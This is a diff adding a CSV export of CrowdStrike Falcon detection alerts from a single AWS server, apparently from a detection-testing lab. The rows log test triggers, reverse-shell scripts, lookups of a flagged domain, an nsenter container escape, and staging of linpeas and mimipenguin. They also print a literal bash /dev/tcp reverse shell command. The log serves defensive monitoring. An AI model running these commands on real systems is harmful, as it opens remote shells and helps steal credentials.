@@ -1,0 +1,145 @@
+Severity,Time,Worker node,Host ID,Host type,Tactic & technique,Detection name,Container ID,File name,File path,Action taken,Environment,Cluster Name,Command line,Detection description,Detection ID,Image ID,Pod name,Namespace
+High,2026-03-18T23:15:37Z,SE-CJA-AMZN1-WV,ddecab7a0a774996a3c71be50c92b3ab,Server,Falcon Overwatch via Malicious Activity,"[
+    ""TestTriggerHigh""
+   ]",f0e8279dff4dffe644b21fe508e27c179ea5792af34292ae51b7fad529d40f75,bash,/usr/bin/bash,"Detection, standard detection.",AWS_EC2_V2,--,bash crowdstrike_test_high,A high level detection was triggered on this process for testing purposes.,ind:ddecab7a0a774996a3c71be50c92b3ab:18155845075-10304-2104848,ef26b768e5668e8a88eeccb7319a578398a2ed4d06cf93313b85b5b85fc68f10,--,--
+High,2026-03-18T23:15:17Z,SE-CJA-AMZN1-WV,ddecab7a0a774996a3c71be50c92b3ab,Server,Falcon Overwatch via Malicious Activity,"[
+    ""TestTriggerHigh""
+   ]",f0e8279dff4dffe644b21fe508e27c179ea5792af34292ae51b7fad529d40f75,bash,/usr/bin/bash,"Detection, standard detection.",AWS_EC2_V2,--,bash crowdstrike_test_high,A high level detection was triggered on this process for testing purposes.,ind:ddecab7a0a774996a3c71be50c92b3ab:18133411083-10304-2103056,ef26b768e5668e8a88eeccb7319a578398a2ed4d06cf93313b85b5b85fc68f10,--,--
+High,2026-03-18T23:14:51Z,SE-CJA-AMZN1-WV,ddecab7a0a774996a3c71be50c92b3ab,Server,Falcon Overwatch via Malicious Activity,"[
+    ""TestTriggerHigh""
+   ]",f0e8279dff4dffe644b21fe508e27c179ea5792af34292ae51b7fad529d40f75,bash,/usr/bin/bash,"Detection, standard detection.",AWS_EC2_V2,--,bash crowdstrike_test_high,A high level detection was triggered on this process for testing purposes.,ind:ddecab7a0a774996a3c71be50c92b3ab:18123540416-10304-2101520,ef26b768e5668e8a88eeccb7319a578398a2ed4d06cf93313b85b5b85fc68f10,--,--
+High,2026-03-18T23:14:40Z,SE-CJA-AMZN1-WV,ddecab7a0a774996a3c71be50c92b3ab,Server,Falcon Overwatch via Malicious Activity,"[
+    ""TestTriggerHigh""
+   ]",f0e8279dff4dffe644b21fe508e27c179ea5792af34292ae51b7fad529d40f75,bash,/usr/bin/bash,"Detection, standard detection.",AWS_EC2_V2,--,bash crowdstrike_test_high,A high level detection was triggered on this process for testing purposes.,ind:ddecab7a0a774996a3c71be50c92b3ab:18111499137-10304-2100496,ef26b768e5668e8a88eeccb7319a578398a2ed4d06cf93313b85b5b85fc68f10,--,--
+High,2026-03-18T23:14:19Z,SE-CJA-AMZN1-WV,ddecab7a0a774996a3c71be50c92b3ab,Server,Falcon Overwatch via Malicious Activity,"[
+    ""TestTriggerHigh""
+   ]",f0e8279dff4dffe644b21fe508e27c179ea5792af34292ae51b7fad529d40f75,bash,/usr/bin/bash,"Detection, standard detection.",AWS_EC2_V2,--,bash crowdstrike_test_high,A high level detection was triggered on this process for testing purposes.,ind:ddecab7a0a774996a3c71be50c92b3ab:18099680179-10304-2098960,ef26b768e5668e8a88eeccb7319a578398a2ed4d06cf93313b85b5b85fc68f10,--,--
+High,2026-03-18T23:14:02Z,SE-CJA-AMZN1-WV,ddecab7a0a774996a3c71be50c92b3ab,Server,Falcon Overwatch via Malicious Activity,"[
+    ""TestTriggerHigh""
+   ]",f0e8279dff4dffe644b21fe508e27c179ea5792af34292ae51b7fad529d40f75,bash,/usr/bin/bash,"Detection, standard detection.",AWS_EC2_V2,--,bash crowdstrike_test_high,A high level detection was triggered on this process for testing purposes.,ind:ddecab7a0a774996a3c71be50c92b3ab:18078095059-10304-2097424,ef26b768e5668e8a88eeccb7319a578398a2ed4d06cf93313b85b5b85fc68f10,--,--
+High,2026-03-18T23:13:30Z,SE-CJA-AMZN1-WV,ddecab7a0a774996a3c71be50c92b3ab,Server,Falcon Overwatch via Malicious Activity,"[
+    ""TestTriggerHigh""
+   ]",f0e8279dff4dffe644b21fe508e27c179ea5792af34292ae51b7fad529d40f75,bash,/usr/bin/bash,"Detection, standard detection.",AWS_EC2_V2,--,bash crowdstrike_test_high,A high level detection was triggered on this process for testing purposes.,ind:ddecab7a0a774996a3c71be50c92b3ab:18049572009-10304-2095376,ef26b768e5668e8a88eeccb7319a578398a2ed4d06cf93313b85b5b85fc68f10,--,--
+High,2026-03-18T23:13:24Z,SE-CJA-AMZN1-WV,ddecab7a0a774996a3c71be50c92b3ab,Server,Falcon Overwatch via Malicious Activity,"[
+    ""TestTriggerHigh""
+   ]",f0e8279dff4dffe644b21fe508e27c179ea5792af34292ae51b7fad529d40f75,bash,/usr/bin/bash,"Detection, standard detection.",AWS_EC2_V2,--,bash crowdstrike_test_high,A high level detection was triggered on this process for testing purposes.,ind:ddecab7a0a774996a3c71be50c92b3ab:18039925774-10304-2092304,ef26b768e5668e8a88eeccb7319a578398a2ed4d06cf93313b85b5b85fc68f10,--,--
+Critical,2026-03-18T23:13:18Z,SE-CJA-AMZN1-WV,ddecab7a0a774996a3c71be50c92b3ab,Server,Execution via Command and Scripting Interpreter,"[
+    ""GenReverseShell""
+   ]",f0e8279dff4dffe644b21fe508e27c179ea5792af34292ae51b7fad529d40f75,bash,/usr/bin/bash,"Detection, process would have been killed if related prevention policy setting was enabled.",AWS_EC2_V2,--,/bin/bash /bin/learning/01_Remote_Access_Shell.sh,A reverse shell has been detected on your host. It may provide adversaries with an interactive terminal. Check the process tree to determine if this access was expected.,ind:ddecab7a0a774996a3c71be50c92b3ab:18029870954-30128-2089488,ef26b768e5668e8a88eeccb7319a578398a2ed4d06cf93313b85b5b85fc68f10,--,--
+Critical,2026-03-18T23:13:11Z,SE-CJA-AMZN1-WV,ddecab7a0a774996a3c71be50c92b3ab,Server,Execution via Command and Scripting Interpreter,"[
+    ""GenReverseShell""
+   ]",f0e8279dff4dffe644b21fe508e27c179ea5792af34292ae51b7fad529d40f75,bash,/usr/bin/bash,"Detection, process would have been killed if related prevention policy setting was enabled.",AWS_EC2_V2,--,/bin/bash /bin/learning/01_Remote_Access_Shell.sh,A reverse shell has been detected on your host. It may provide adversaries with an interactive terminal. Check the process tree to determine if this access was expected.,ind:ddecab7a0a774996a3c71be50c92b3ab:18017535272-30128-2087184,ef26b768e5668e8a88eeccb7319a578398a2ed4d06cf93313b85b5b85fc68f10,--,--
+High,2026-03-18T23:09:45Z,SE-CJA-AMZN1-WV,ddecab7a0a774996a3c71be50c92b3ab,Server,Falcon Intel via Intelligence Indicator - Domain,"[
+    ""IntelDomainHigh""
+   ]",f0e8279dff4dffe644b21fe508e27c179ea5792af34292ae51b7fad529d40f75,ping,/usr/bin/ping,"Detection, standard detection.",AWS_EC2_V2,--,ping -c 3 swungheaving.com,A domain lookup matched a CrowdStrike Intelligence indicator that has previously been used in targeted attacks.,ind:ddecab7a0a774996a3c71be50c92b3ab:17806319379-4900-2060304,ef26b768e5668e8a88eeccb7319a578398a2ed4d06cf93313b85b5b85fc68f10,--,--
+High,2026-03-18T23:09:29Z,SE-CJA-AMZN1-WV,ddecab7a0a774996a3c71be50c92b3ab,Server,Falcon Intel via Intelligence Indicator - Domain,"[
+    ""IntelDomainHigh""
+   ]",f0e8279dff4dffe644b21fe508e27c179ea5792af34292ae51b7fad529d40f75,nslookup,/usr/bin/nslookup,"Detection, standard detection.",AWS_EC2_V2,--,nslookup swungheaving.com,A domain lookup matched a CrowdStrike Intelligence indicator that has previously been used in targeted attacks.,ind:ddecab7a0a774996a3c71be50c92b3ab:17805249066-4900-2054928,ef26b768e5668e8a88eeccb7319a578398a2ed4d06cf93313b85b5b85fc68f10,--,--
+High,2026-03-18T23:09:17Z,SE-CJA-AMZN1-WV,ddecab7a0a774996a3c71be50c92b3ab,Server,Falcon Overwatch via Malicious Activity,"[
+    ""TestTriggerHigh""
+   ]",f0e8279dff4dffe644b21fe508e27c179ea5792af34292ae51b7fad529d40f75,bash,/usr/bin/bash,"Detection, standard detection.",AWS_EC2_V2,--,bash crowdstrike_test_high,A high level detection was triggered on this process for testing purposes.,ind:ddecab7a0a774996a3c71be50c92b3ab:17768292527-10304-2041360,ef26b768e5668e8a88eeccb7319a578398a2ed4d06cf93313b85b5b85fc68f10,--,--
+Critical,2026-03-18T23:09:16Z,SE-CJA-AMZN1-WV,ddecab7a0a774996a3c71be50c92b3ab,Server,Execution via Command and Scripting Interpreter,"[
+    ""GenReverseShell""
+   ]",f0e8279dff4dffe644b21fe508e27c179ea5792af34292ae51b7fad529d40f75,bash,/usr/bin/bash,"Detection, process would have been killed if related prevention policy setting was enabled.",AWS_EC2_V2,--,/bin/bash /bin/chains/Persistence_Establishment.sh,A reverse shell has been detected on your host. It may provide adversaries with an interactive terminal. Check the process tree to determine if this access was expected.,ind:ddecab7a0a774996a3c71be50c92b3ab:17762618690-30128-2039824,ef26b768e5668e8a88eeccb7319a578398a2ed4d06cf93313b85b5b85fc68f10,--,--
+High,2026-03-18T23:08:06Z,SE-CJA-AMZN1-WV,ddecab7a0a774996a3c71be50c92b3ab,Server,Falcon Intel via Intelligence Indicator - Domain,"[
+    ""IntelDomainHigh""
+   ]",f0e8279dff4dffe644b21fe508e27c179ea5792af34292ae51b7fad529d40f75,ping,/usr/bin/ping,"Detection, standard detection.",AWS_EC2_V2,--,ping -c 3 swungheaving.com,A domain lookup matched a CrowdStrike Intelligence indicator that has previously been used in targeted attacks.,ind:ddecab7a0a774996a3c71be50c92b3ab:17734958706-4900-2037776,ef26b768e5668e8a88eeccb7319a578398a2ed4d06cf93313b85b5b85fc68f10,--,--
+High,2026-03-18T23:07:51Z,SE-CJA-AMZN1-WV,ddecab7a0a774996a3c71be50c92b3ab,Server,Falcon Intel via Intelligence Indicator - Domain,"[
+    ""IntelDomainHigh""
+   ]",f0e8279dff4dffe644b21fe508e27c179ea5792af34292ae51b7fad529d40f75,nslookup,/usr/bin/nslookup,"Detection, standard detection.",AWS_EC2_V2,--,nslookup swungheaving.com,A domain lookup matched a CrowdStrike Intelligence indicator that has previously been used in targeted attacks.,ind:ddecab7a0a774996a3c71be50c92b3ab:17734252258-4900-2033424,ef26b768e5668e8a88eeccb7319a578398a2ed4d06cf93313b85b5b85fc68f10,--,--
+High,2026-03-18T23:07:39Z,SE-CJA-AMZN1-WV,ddecab7a0a774996a3c71be50c92b3ab,Server,Falcon Overwatch via Malicious Activity,"[
+    ""TestTriggerHigh""
+   ]",f0e8279dff4dffe644b21fe508e27c179ea5792af34292ae51b7fad529d40f75,bash,/usr/bin/bash,"Detection, standard detection.",AWS_EC2_V2,--,bash crowdstrike_test_high,A high level detection was triggered on this process for testing purposes.,ind:ddecab7a0a774996a3c71be50c92b3ab:17691860966-10304-2019088,ef26b768e5668e8a88eeccb7319a578398a2ed4d06cf93313b85b5b85fc68f10,--,--
+Critical,2026-03-18T23:07:38Z,SE-CJA-AMZN1-WV,ddecab7a0a774996a3c71be50c92b3ab,Server,Execution via Command and Scripting Interpreter,"[
+    ""GenReverseShell""
+   ]",f0e8279dff4dffe644b21fe508e27c179ea5792af34292ae51b7fad529d40f75,bash,/usr/bin/bash,"Detection, process would have been killed if related prevention policy setting was enabled.",AWS_EC2_V2,--,/bin/bash /bin/chains/Persistence_Establishment.sh,A reverse shell has been detected on your host. It may provide adversaries with an interactive terminal. Check the process tree to determine if this access was expected.,ind:ddecab7a0a774996a3c71be50c92b3ab:17685937159-30128-2017552,ef26b768e5668e8a88eeccb7319a578398a2ed4d06cf93313b85b5b85fc68f10,--,--
+High,2026-03-18T23:07:24Z,SE-CJA-AMZN1-WV,ddecab7a0a774996a3c71be50c92b3ab,Server,Falcon Intel via Intelligence Indicator - Domain,"[
+    ""IntelDomainHigh""
+   ]",f0e8279dff4dffe644b21fe508e27c179ea5792af34292ae51b7fad529d40f75,ping,/usr/bin/ping,"Detection, standard detection.",AWS_EC2_V2,--,ping -c 3 swungheaving.com,A domain lookup matched a CrowdStrike Intelligence indicator that has previously been used in targeted attacks.,ind:ddecab7a0a774996a3c71be50c92b3ab:17673445583-4900-2017040,ef26b768e5668e8a88eeccb7319a578398a2ed4d06cf93313b85b5b85fc68f10,--,--
+High,2026-03-18T23:07:04Z,SE-CJA-AMZN1-WV,ddecab7a0a774996a3c71be50c92b3ab,Server,Privilege Escalation via Escape to Host,"[
+    ""ContainerEscape""
+   ]",f0e8279dff4dffe644b21fe508e27c179ea5792af34292ae51b7fad529d40f75,nsenter,/usr/bin/nsenter,"Detection, standard detection.",AWS_EC2_V2,--,nsenter --target 1 --mount --uts --ipc --net --pid -- whoami,An attempt to breakout of a container has been detected. Adversaries attempt to escape containers in order to access other containerised resources from the host level or the host itself. Please review the events to determine if this activity was expected.,ind:ddecab7a0a774996a3c71be50c92b3ab:17668071980-30215-2010384,ef26b768e5668e8a88eeccb7319a578398a2ed4d06cf93313b85b5b85fc68f10,--,--
+High,2026-03-18T23:06:57Z,SE-CJA-AMZN1-WV,ddecab7a0a774996a3c71be50c92b3ab,Server,Falcon Overwatch via Malicious Activity,"[
+    ""TestTriggerHigh""
+   ]",f0e8279dff4dffe644b21fe508e27c179ea5792af34292ae51b7fad529d40f75,bash,/usr/bin/bash,"Detection, standard detection.",AWS_EC2_V2,--,bash crowdstrike_test_high,A high level detection was triggered on this process for testing purposes.,ind:ddecab7a0a774996a3c71be50c92b3ab:17641326547-10304-2007056,ef26b768e5668e8a88eeccb7319a578398a2ed4d06cf93313b85b5b85fc68f10,--,--
+High,2026-03-18T23:06:15Z,SE-CJA-AMZN1-WV,ddecab7a0a774996a3c71be50c92b3ab,Server,Falcon Intel via Intelligence Indicator - Domain,"[
+    ""IntelDomainHigh""
+   ]",f0e8279dff4dffe644b21fe508e27c179ea5792af34292ae51b7fad529d40f75,ping,/usr/bin/ping,"Detection, standard detection.",AWS_EC2_V2,--,ping -c 3 swungheaving.com,A domain lookup matched a CrowdStrike Intelligence indicator that has previously been used in targeted attacks.,ind:ddecab7a0a774996a3c71be50c92b3ab:17619308736-4900-2006544,ef26b768e5668e8a88eeccb7319a578398a2ed4d06cf93313b85b5b85fc68f10,--,--
+High,2026-03-18T23:06:12Z,SE-CJA-AMZN1-WV,ddecab7a0a774996a3c71be50c92b3ab,Server,Execution via Command and Scripting Interpreter,"[
+    ""ExecutionLin""
+   ]",f0e8279dff4dffe644b21fe508e27c179ea5792af34292ae51b7fad529d40f75,coreutils,/usr/bin/coreutils,"Detection, standard detection.",AWS_EC2_V2,--,/usr/bin/coreutils --coreutils-prog-shebang=rm /usr/bin/rm -f /tmp/linpeas.sh /tmp/lse.sh /tmp/mimipenguin.sh,The commands executed on this CLI are suspicious and may be related to malicious activity. Review the commands to see if they are expected.,ind:ddecab7a0a774996a3c71be50c92b3ab:17631193336-30113-2004496,ef26b768e5668e8a88eeccb7319a578398a2ed4d06cf93313b85b5b85fc68f10,--,--
+High,2026-03-18T23:05:50Z,SE-CJA-AMZN1-WV,ddecab7a0a774996a3c71be50c92b3ab,Server,Execution via Command and Scripting Interpreter,"[
+    ""ExecutionLin""
+   ]",f0e8279dff4dffe644b21fe508e27c179ea5792af34292ae51b7fad529d40f75,coreutils,/usr/bin/coreutils,"Detection, standard detection.",AWS_EC2_V2,--,/usr/bin/coreutils --coreutils-prog-shebang=chmod /usr/bin/chmod +x /tmp/linpeas.sh /tmp/lse.sh /tmp/mimipenguin.sh,The commands executed on this CLI are suspicious and may be related to malicious activity. Review the commands to see if they are expected.,ind:ddecab7a0a774996a3c71be50c92b3ab:17572104852-30113-1992976,ef26b768e5668e8a88eeccb7319a578398a2ed4d06cf93313b85b5b85fc68f10,--,--
+High,2026-03-18T23:05:49Z,SE-CJA-AMZN1-WV,ddecab7a0a774996a3c71be50c92b3ab,Server,Execution via Command and Scripting Interpreter,"[
+    ""ExecutionLin""
+   ]",f0e8279dff4dffe644b21fe508e27c179ea5792af34292ae51b7fad529d40f75,coreutils,/usr/bin/coreutils,"Detection, standard detection.",AWS_EC2_V2,--,/usr/bin/coreutils --coreutils-prog-shebang=touch /usr/bin/touch /tmp/linpeas.sh,The commands executed on this CLI are suspicious and may be related to malicious activity. Review the commands to see if they are expected.,ind:ddecab7a0a774996a3c71be50c92b3ab:17568826880-30113-1992208,ef26b768e5668e8a88eeccb7319a578398a2ed4d06cf93313b85b5b85fc68f10,--,--
+High,2026-03-18T23:05:48Z,SE-CJA-AMZN1-WV,ddecab7a0a774996a3c71be50c92b3ab,Server,Falcon Overwatch via Malicious Activity,"[
+    ""TestTriggerHigh""
+   ]",f0e8279dff4dffe644b21fe508e27c179ea5792af34292ae51b7fad529d40f75,bash,/usr/bin/bash,"Detection, standard detection.",AWS_EC2_V2,--,bash crowdstrike_test_high,A high level detection was triggered on this process for testing purposes.,ind:ddecab7a0a774996a3c71be50c92b3ab:17565809175-10304-1991696,ef26b768e5668e8a88eeccb7319a578398a2ed4d06cf93313b85b5b85fc68f10,--,--
+High,2026-03-18T23:05:26Z,SE-CJA-AMZN1-WV,ddecab7a0a774996a3c71be50c92b3ab,Server,Falcon Intel via Intelligence Indicator - Domain,"[
+    ""IntelDomainHigh""
+   ]",f0e8279dff4dffe644b21fe508e27c179ea5792af34292ae51b7fad529d40f75,ping,/usr/bin/ping,"Detection, standard detection.",AWS_EC2_V2,--,ping -c 3 swungheaving.com,A domain lookup matched a CrowdStrike Intelligence indicator that has previously been used in targeted attacks.,ind:ddecab7a0a774996a3c71be50c92b3ab:17532200918-4900-1990672,ef26b768e5668e8a88eeccb7319a578398a2ed4d06cf93313b85b5b85fc68f10,--,--
+High,2026-03-18T23:05:20Z,SE-CJA-AMZN1-WV,ddecab7a0a774996a3c71be50c92b3ab,Server,Falcon Intel via Intelligence Indicator - Domain,"[
+    ""IntelDomainHigh""
+   ]",f0e8279dff4dffe644b21fe508e27c179ea5792af34292ae51b7fad529d40f75,nslookup,/usr/bin/nslookup,"Detection, standard detection.",AWS_EC2_V2,--,nslookup swungheaving.com,A domain lookup matched a CrowdStrike Intelligence indicator that has previously been used in targeted attacks.,ind:ddecab7a0a774996a3c71be50c92b3ab:17531415393-4900-1988624,ef26b768e5668e8a88eeccb7319a578398a2ed4d06cf93313b85b5b85fc68f10,--,--
+High,2026-03-18T23:04:53Z,SE-CJA-AMZN1-WV,ddecab7a0a774996a3c71be50c92b3ab,Server,Falcon Overwatch via Malicious Activity,"[
+    ""TestTriggerHigh""
+   ]",f0e8279dff4dffe644b21fe508e27c179ea5792af34292ae51b7fad529d40f75,bash,/usr/bin/bash,"Detection, standard detection.",AWS_EC2_V2,--,bash crowdstrike_test_high,A high level detection was triggered on this process for testing purposes.,ind:ddecab7a0a774996a3c71be50c92b3ab:17499848341-10304-1979920,ef26b768e5668e8a88eeccb7319a578398a2ed4d06cf93313b85b5b85fc68f10,--,--
+High,2026-03-18T22:26:25Z,SE-CJA-AMZN1-WV,ddecab7a0a774996a3c71be50c92b3ab,Server,Falcon Overwatch via Malicious Activity,"[
+    ""TestTriggerHigh""
+   ]",f0e8279dff4dffe644b21fe508e27c179ea5792af34292ae51b7fad529d40f75,bash,/usr/bin/bash,"Detection, standard detection.",AWS_EC2_V2,--,bash crowdstrike_test_high,A high level detection was triggered on this process for testing purposes.,ind:ddecab7a0a774996a3c71be50c92b3ab:16993003619-10304-1932048,ef26b768e5668e8a88eeccb7319a578398a2ed4d06cf93313b85b5b85fc68f10,--,--
+High,2026-03-18T22:24:46Z,SE-CJA-AMZN1-WV,ddecab7a0a774996a3c71be50c92b3ab,Server,Falcon Overwatch via Malicious Activity,"[
+    ""TestTriggerHigh""
+   ]",f0e8279dff4dffe644b21fe508e27c179ea5792af34292ae51b7fad529d40f75,bash,/usr/bin/bash,"Detection, standard detection.",AWS_EC2_V2,--,bash crowdstrike_test_high,A high level detection was triggered on this process for testing purposes.,ind:ddecab7a0a774996a3c71be50c92b3ab:16935322063-10304-1925904,ef26b768e5668e8a88eeccb7319a578398a2ed4d06cf93313b85b5b85fc68f10,--,--
+High,2026-03-18T22:23:11Z,SE-CJA-AMZN1-WV,ddecab7a0a774996a3c71be50c92b3ab,Server,Falcon Overwatch via Malicious Activity,"[
+    ""TestTriggerHigh""
+   ]",f0e8279dff4dffe644b21fe508e27c179ea5792af34292ae51b7fad529d40f75,bash,/usr/bin/bash,"Detection, standard detection.",AWS_EC2_V2,--,bash crowdstrike_test_high,A high level detection was triggered on this process for testing purposes.,ind:ddecab7a0a774996a3c71be50c92b3ab:16911487857-10304-1924368,ef26b768e5668e8a88eeccb7319a578398a2ed4d06cf93313b85b5b85fc68f10,--,--
+High,2026-03-18T22:22:10Z,SE-CJA-AMZN1-WV,ddecab7a0a774996a3c71be50c92b3ab,Server,Falcon Overwatch via Malicious Activity,"[
+    ""TestTriggerHigh""
+   ]",f0e8279dff4dffe644b21fe508e27c179ea5792af34292ae51b7fad529d40f75,bash,/usr/bin/bash,"Detection, standard detection.",AWS_EC2_V2,--,bash crowdstrike_test_high,A high level detection was triggered on this process for testing purposes.,ind:ddecab7a0a774996a3c71be50c92b3ab:16895195791-10304-1923344,ef26b768e5668e8a88eeccb7319a578398a2ed4d06cf93313b85b5b85fc68f10,--,--
+High,2026-03-18T22:19:15Z,SE-CJA-AMZN1-WV,ddecab7a0a774996a3c71be50c92b3ab,Server,Falcon Overwatch via Malicious Activity,"[
+    ""TestTriggerHigh""
+   ]",f0e8279dff4dffe644b21fe508e27c179ea5792af34292ae51b7fad529d40f75,bash,/usr/bin/bash,"Detection, standard detection.",AWS_EC2_V2,--,bash crowdstrike_test_high,A high level detection was triggered on this process for testing purposes.,ind:ddecab7a0a774996a3c71be50c92b3ab:16851762046-10304-1920528,ef26b768e5668e8a88eeccb7319a578398a2ed4d06cf93313b85b5b85fc68f10,--,--
+High,2026-03-18T22:17:37Z,SE-CJA-AMZN1-WV,ddecab7a0a774996a3c71be50c92b3ab,Server,Falcon Overwatch via Malicious Activity,"[
+    ""TestTriggerHigh""
+   ]",f0e8279dff4dffe644b21fe508e27c179ea5792af34292ae51b7fad529d40f75,bash,/usr/bin/bash,"Detection, standard detection.",AWS_EC2_V2,--,bash crowdstrike_test_high,A high level detection was triggered on this process for testing purposes.,ind:ddecab7a0a774996a3c71be50c92b3ab:16813587252-10304-1917200,ef26b768e5668e8a88eeccb7319a578398a2ed4d06cf93313b85b5b85fc68f10,--,--
+Critical,2026-03-18T22:17:25Z,SE-CJA-AMZN1-WV,ddecab7a0a774996a3c71be50c92b3ab,Server,Execution via Command and Scripting Interpreter,"[
+    ""GenReverseShell""
+   ]",f0e8279dff4dffe644b21fe508e27c179ea5792af34292ae51b7fad529d40f75,bash,/usr/bin/bash,"Detection, process would have been killed if related prevention policy setting was enabled.",AWS_EC2_V2,--,/bin/bash /bin/learning/01_Remote_Access_Shell.sh,A reverse shell has been detected on your host. It may provide adversaries with an interactive terminal. Check the process tree to determine if this access was expected.,ind:ddecab7a0a774996a3c71be50c92b3ab:16795195409-30128-1913872,ef26b768e5668e8a88eeccb7319a578398a2ed4d06cf93313b85b5b85fc68f10,--,--
+High,2026-03-18T22:16:33Z,SE-CJA-AMZN1-WV,ddecab7a0a774996a3c71be50c92b3ab,Server,Falcon Intel via Intelligence Indicator - Domain,"[
+    ""IntelDomainHigh""
+   ]",f0e8279dff4dffe644b21fe508e27c179ea5792af34292ae51b7fad529d40f75,ping,/usr/bin/ping,"Detection, standard detection.",AWS_EC2_V2,--,ping -c 3 swungheaving.com,A domain lookup matched a CrowdStrike Intelligence indicator that has previously been used in targeted attacks.,ind:ddecab7a0a774996a3c71be50c92b3ab:16772197231-4900-1912080,ef26b768e5668e8a88eeccb7319a578398a2ed4d06cf93313b85b5b85fc68f10,--,--
+High,2026-03-18T22:16:19Z,SE-CJA-AMZN1-WV,ddecab7a0a774996a3c71be50c92b3ab,Server,Falcon Intel via Intelligence Indicator - Domain,"[
+    ""IntelDomainHigh""
+   ]",f0e8279dff4dffe644b21fe508e27c179ea5792af34292ae51b7fad529d40f75,ping,/usr/bin/ping,"Detection, standard detection.",AWS_EC2_V2,--,ping -c 3 swungheaving.com,A domain lookup matched a CrowdStrike Intelligence indicator that has previously been used in targeted attacks.,ind:ddecab7a0a774996a3c71be50c92b3ab:16707246451-4900-1907984,ef26b768e5668e8a88eeccb7319a578398a2ed4d06cf93313b85b5b85fc68f10,--,--
+High,2026-03-18T22:16:19Z,SE-CJA-AMZN1-WV,ddecab7a0a774996a3c71be50c92b3ab,Server,Falcon Intel via Intelligence Indicator - Domain,"[
+    ""IntelDomainHigh""
+   ]",f0e8279dff4dffe644b21fe508e27c179ea5792af34292ae51b7fad529d40f75,nslookup,/usr/bin/nslookup,"Detection, standard detection.",AWS_EC2_V2,--,nslookup swungheaving.com,A domain lookup matched a CrowdStrike Intelligence indicator that has previously been used in targeted attacks.,ind:ddecab7a0a774996a3c71be50c92b3ab:16771875334-4900-1906448,ef26b768e5668e8a88eeccb7319a578398a2ed4d06cf93313b85b5b85fc68f10,--,--
+High,2026-03-18T22:16:06Z,SE-CJA-AMZN1-WV,ddecab7a0a774996a3c71be50c92b3ab,Server,Falcon Overwatch via Malicious Activity,"[
+    ""TestTriggerHigh""
+   ]",f0e8279dff4dffe644b21fe508e27c179ea5792af34292ae51b7fad529d40f75,bash,/usr/bin/bash,"Detection, standard detection.",AWS_EC2_V2,--,bash crowdstrike_test_high,A high level detection was triggered on this process for testing purposes.,ind:ddecab7a0a774996a3c71be50c92b3ab:16719686916-10304-1889552,ef26b768e5668e8a88eeccb7319a578398a2ed4d06cf93313b85b5b85fc68f10,--,--
+Critical,2026-03-18T22:16:05Z,SE-CJA-AMZN1-WV,ddecab7a0a774996a3c71be50c92b3ab,Server,Execution via Command and Scripting Interpreter,"[
+    ""GenReverseShell""
+   ]",f0e8279dff4dffe644b21fe508e27c179ea5792af34292ae51b7fad529d40f75,bash,/usr/bin/bash,"Detection, process would have been killed if related prevention policy setting was enabled.",AWS_EC2_V2,--,/bin/bash /bin/chains/Persistence_Establishment.sh,A reverse shell has been detected on your host. It may provide adversaries with an interactive terminal. Check the process tree to determine if this access was expected.,ind:ddecab7a0a774996a3c71be50c92b3ab:16713687883-30128-1887760,ef26b768e5668e8a88eeccb7319a578398a2ed4d06cf93313b85b5b85fc68f10,--,--
+High,2026-03-18T22:16:01Z,SE-CJA-AMZN1-WV,ddecab7a0a774996a3c71be50c92b3ab,Server,Falcon Intel via Intelligence Indicator - Domain,"[
+    ""IntelDomainHigh""
+   ]",f0e8279dff4dffe644b21fe508e27c179ea5792af34292ae51b7fad529d40f75,nslookup,/usr/bin/nslookup,"Detection, standard detection.",AWS_EC2_V2,--,nslookup swungheaving.com,A domain lookup matched a CrowdStrike Intelligence indicator that has previously been used in targeted attacks.,ind:ddecab7a0a774996a3c71be50c92b3ab:16705348360-4900-1883152,ef26b768e5668e8a88eeccb7319a578398a2ed4d06cf93313b85b5b85fc68f10,--,--
+High,2026-03-18T22:15:47Z,SE-CJA-AMZN1-WV,ddecab7a0a774996a3c71be50c92b3ab,Server,Falcon Overwatch via Malicious Activity,"[
+    ""TestTriggerHigh""
+   ]",f0e8279dff4dffe644b21fe508e27c179ea5792af34292ae51b7fad529d40f75,bash,/usr/bin/bash,"Detection, standard detection.",AWS_EC2_V2,--,bash crowdstrike_test_high,A high level detection was triggered on this process for testing purposes.,ind:ddecab7a0a774996a3c71be50c92b3ab:16672670221-10304-1873168,ef26b768e5668e8a88eeccb7319a578398a2ed4d06cf93313b85b5b85fc68f10,--,--
+High,2026-03-18T20:46:53Z,SE-CJA-AMZN1-WV,ddecab7a0a774996a3c71be50c92b3ab,Server,Privilege Escalation via Escape to Host,"[
+    ""ContainerEscape""
+   ]",f9169bfecedaca721d0113dbdfc75bd471b4cf61fc368287ee04d762056708de,bash,/usr/bin/bash,"Detection, process would have been killed if related prevention policy setting was enabled.",AWS_EC2_V2,--,/bin/bash /bin/modern/Privileged_Container_Escape.sh,An attempt to breakout of a container has been detected. Adversaries attempt to escape containers in order to access other containerised resources from the host level or the host itself. Please review the events to determine if this activity was expected.,ind:ddecab7a0a774996a3c71be50c92b3ab:13277459218-30215-1432336,5386f8a3d5319a6d7934f915fb866d84ce7b2d212c778c053c3477b811b5d9f0,--,--
+High,2026-03-18T19:45:09Z,SE-CJA-AMZN1-WV,ddecab7a0a774996a3c71be50c92b3ab,Server,Command and Control via Remote Access Tools,"[
+    ""BashReverseShell""
+   ]",b997ab683f5b08fbe56ab401aa5a2c28182780797e95c2bde598344acb030636,bash,/usr/bin/bash,"Prevention, process killed.",AWS_EC2_V2,--,/bin/sh -c bash -i >& /dev/tcp/172.17.0.21/4444 0>&1,Bash has created an interactive terminal for a remote host. Check the process tree to determine if malicious commands were executed and if this access was expected.,ind:ddecab7a0a774996a3c71be50c92b3ab:10393765178-30103-1028624,66c3f3d38cfa0b24d392bf04b534272ba5ef83b9abf6dc6aa672aa7841c5afc6,--,--
+High,2026-03-18T19:45:09Z,SE-CJA-AMZN1-WV,ddecab7a0a774996a3c71be50c92b3ab,Server,Command and Control via Remote Access Tools,"[
+    ""BashReverseShell""
+   ]",b997ab683f5b08fbe56ab401aa5a2c28182780797e95c2bde598344acb030636,bash,/usr/bin/bash,"Prevention, process killed.",AWS_EC2_V2,--,/bin/sh -c bash -i >& /dev/tcp/172.17.0.21/4444 0>&1,Bash has created an interactive terminal for a remote host. Check the process tree to determine if malicious commands were executed and if this access was expected.,ind:ddecab7a0a774996a3c71be50c92b3ab:10392856359-30103-1027088,66c3f3d38cfa0b24d392bf04b534272ba5ef83b9abf6dc6aa672aa7841c5afc6,--,--
+High,2026-03-18T19:34:00Z,SE-CJA-AMZN1-WV,ddecab7a0a774996a3c71be50c92b3ab,Server,Command and Control via Remote Access Tools,"[
